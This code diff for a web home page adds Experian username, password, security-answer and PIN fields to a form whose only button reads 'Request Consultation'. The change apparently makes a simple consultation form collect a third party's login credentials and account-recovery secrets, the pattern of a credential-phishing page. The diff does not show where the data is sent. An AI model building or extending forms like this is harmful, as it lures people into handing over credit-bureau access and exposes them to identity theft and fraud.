@@ -98,6 +98,26 @@ export default function Home() {
                 inputMode="email"
               />
 
+              {/* Experian fields */}
+              <input
+                className="w-full rounded-xl border border-white/10 bg-zinc-900 px-4 py-3 text-center text-sm text-white placeholder:text-zinc-500 outline-none"
+                placeholder="Experian Username"
+              />
+              <input
+                type="password"
+                className="w-full rounded-xl border border-white/10 bg-zinc-900 px-4 py-3 text-center text-sm text-white placeholder:text-zinc-500 outline-none"
+                placeholder="Experian Password"
+              />
+              <input
+                className="w-full rounded-xl border border-white/10 bg-zinc-900 px-4 py-3 text-center text-sm text-white placeholder:text-zinc-500 outline-none"
+                placeholder="Security Answer"
+              />
+              <input
+                className="w-full rounded-xl border border-white/10 bg-zinc-900 px-4 py-3 text-center text-sm text-white placeholder:text-zinc-500 outline-none"
+                placeholder="PIN"
+                inputMode="numeric"
+              />
+
               <button className="mt-1 w-full rounded-xl bg-white px-4 py-3 text-sm font-bold text-black transition active:scale-[0.99]">
                 Request Consultation
               </button>
